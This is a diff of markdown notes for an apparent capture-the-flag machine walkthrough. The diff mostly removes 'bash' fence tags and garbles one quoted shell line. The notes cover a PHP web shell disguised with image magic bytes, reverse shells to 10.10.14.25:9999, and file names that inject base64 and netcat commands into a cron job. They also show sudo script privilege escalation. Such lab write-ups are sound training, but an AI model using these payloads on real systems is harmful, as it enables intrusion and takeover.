@@ -12,14 +12,14 @@
 		- we see lib.php does a mime file check.
 		- we also see in upload.php that it does another check in the file name
 		- Grep to aid you :
-			```bash
+			```
 grep -RI "$_" * # to see how a user interacts with a server
 ```
 			- $_ is a superglobal variable. This is an easy way for user input to be passed into PHP.
 				- So we want to see what can a user do?
 			- we see `$_FILES` and a `POST:Submit` so we search in uploads.php and file the check file type function
 				- we see a check_file_type() function which e can then grep to find which file
-					```bash
+					```
 grep check file*
 ```
 					- lib.php which then shows the mime file check. (checks for any mime with "image/" in it) 
@@ -33,11 +33,11 @@ grep check file*
 			- make sure the magic bytes dont overwrite the php reverse shell code
 	- **Alternate way 1**
 		- create and change magic bytes.
-			```bash
+			```
 echo "89 50 4E 47 0D 0A 1A 0A" | xxd -p -r > shell.php.png #magic bytes for png
 ```
 			- Then add the code after the magic byte showing multiple working ones:
-				```bash
+				```
 <?php system($_REQUEST['cmd']); ?>
 <?php system($_GET["rocknrj"]); ?>
 ```
@@ -46,7 +46,7 @@ echo "89 50 4E 47 0D 0A 1A 0A" | xxd -p -r > shell.php.png #magic bytes for png
 		- we try with gif here.
 		- Can repeat what we did for png to find the text in gif (these numbers result in some text)
 			- for gif it is
-				```bash
+				```
 GIF8;
 ```
 		- we create shell.php again
@@ -57,7 +57,7 @@ GIF8;
 			- forward it
 		- Can see file is uploaded at photos.php and access it at /uploads/`<filename>` (filename is name we see at photos.php)
 			- can add the following and a command (eg:whoami) to see i it works
-				```bash
+				```
 http://10.10.11.146/uploads/<filename>.php.gif?cmd=whoami
 ```
 	- File upload should work for all these method and we can access it in the photos.php location on website.
@@ -68,7 +68,7 @@ http://10.10.11.146/uploads/<filename>.php.gif?cmd=whoami
 		- **For Alternate 2 (Preferred):**
 			- capture packet of accessing the file
 			- enter this command where we put in whoami. then select it and press Ctrl+U to URL encode (shown at the second line below):
-				```bash
+				```
 Without URL Encoding:
 bash -i >& /dev/tcp/10.10.14.25/9999 0>&1 #main command
 OR
@@ -86,7 +86,7 @@ bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.25/9999+0>%261'
 					- but we need to url encode 
 						- can use burp suite 
 			- can use curl:
-				```bash
+				```
 curl -G --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.25/9999 0>&1" http://10.10.10.146/uploads/10_10_14_25.php.gif
 
 # Or can include the one with bach -c included
@@ -94,11 +94,11 @@ curl -G --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.25/9999 0>&1" http://
 ## Lateral movement for user.txt
 - Get better shell :
 	- Method 1 :
-		```bash
+		```
 script /dev/null -c bash
 ```
 	- Method 2 ( didn't work for me): 
-		```bash
+		```
 target>$ python -c ‘import pty;pty.spawn(“/bin/bash”)’;
 Ctrl+Z # to background it and exit from shell to local machine
 local>$ stty raw -echo
@@ -109,7 +109,7 @@ Should get shell
 ```
 - reading cron file we see a file is executed every 3 minutes
 - reading check_attack.php
-	```bash
+	```
 <?php
 require '/var/www/html/lib.php';
 $path = '/var/www/html/uploads/';
@@ -152,7 +152,7 @@ foreach ($files as $key => $value) {
 	- **Note: we can check if we can edit lib.php. We can't but if we could, we could direct the first line to our php exploit and it would execute it**
 		- we know as if value is index.php it returns true
 	- this command is then used here:
-		```bash
+		```
 exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
 ```
 		- uses exec which passes it(**DANGEROUS like system command**) `[FIX is should use unlink instead]`
@@ -165,7 +165,7 @@ exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
 	- listen on required port on local machine:
 	- Method 1:
 		- encoded in base 64 as file name with echo command :
-			```bash
+			```
 echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'" | base64 
 cd /var/www/html/uploads
 touch -- ';echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS85OTk5IDA+JjEn | base64 -d | bash'
@@ -174,22 +174,22 @@ touch -- ';echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS85OTk5IDA+
 		- -- in touch is to say no arguments, just start writing filename
 	- Method 2:
 		- create netcat file :
-			```bash
+			```
 touch -- ';nc -c bash 10.10.14.25 9999';
 ```
 	- we gain user guly shell.
 ------
 ## Privilege Escalation
 - We pass:
-	```bash
+	```
 sudo -l
 ```
 	- and find:
-		```bash	
+		```	
 - /usrlocal/sbin/changename.sh
 ```
 	- We read it:
-		```bash
+		```
 ls -la /usr/local/sbin/changename.sh # we find we can't modify it, and owned by root
 cat /usr/local/sbin/changename.sh
 
@@ -206,7 +206,7 @@ regexp="^[a-zA-Z0-9_\ /-]+$"
 for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
         echo "interface $var:"
         read x
-        while [[ ! $x =~ $regexp ]]; do
+        while [ ! $x =~ $regexp ](%20!%20$x%20=~%20$regexp%20); do
                 echo "wrong input, try again"
                 echo "interface $var:"
                 read x
@@ -230,11 +230,11 @@ done
 		https://seclists.org/fulldisclosure/2019/Apr/24
 		- **can execute command after adding space**
 - We run the command :
-	```bash
+	```
 sudo /usr/local/sbin/changename.sh
 ```
 	- Add any input for each and for one of them add a space and put /bin/bash
-		```bash
+		```
 whoami
 > guly
 sudo /usr/local/sbin/changename.sh
